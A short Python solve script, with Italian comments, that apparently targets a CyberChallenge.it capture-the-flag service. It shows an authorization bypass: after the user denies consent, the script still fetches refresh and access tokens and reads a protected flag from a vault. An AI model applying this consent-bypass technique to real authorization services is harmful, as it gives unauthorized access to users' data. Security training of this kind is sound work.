
import time
from faas import Faas

HOST = "faas.challs.cyberchallenge.it"
APP_ID = "ffedd69a-cc25-4511-838f-14c5fb167ba0"  # App con flag
VAULT_ID = "1f51074b-75ff-42a6-9694-33bd06de7d3d"
KEY = "flag"

f = Faas(HOST, APP_ID, debug=True)

# Step 1: Chiedi autorizzazione
wait_token = f.authorize()
print(f"🔗 Vai su http://{HOST}/authorize/{APP_ID} per accettare o rifiutare.")
print("👉 Scegli 'Deny', poi premi INVIO qui per continuare.")
input()

# Step 2: Prova comunque a ottenere il refresh_token
refresh_token = f.get_refresh_token()
if not refresh_token:
    print("❌ Nessun refresh_token ottenuto.")
    exit(1)

print(f"✅ Refresh token ottenuto: {refresh_token}")

# Step 3: Prova a ottenere l'access token
auth_token = f.get_auth_token()
if not auth_token:
    print("❌ Nessun access token.")
    exit(1)

print(f"✅ Access token: {auth_token}")

# Step 4: Prova ad accedere al vault
value = f.get_value(VAULT_ID, KEY)
print(f"🏁 Flag trovata? -> {value}")
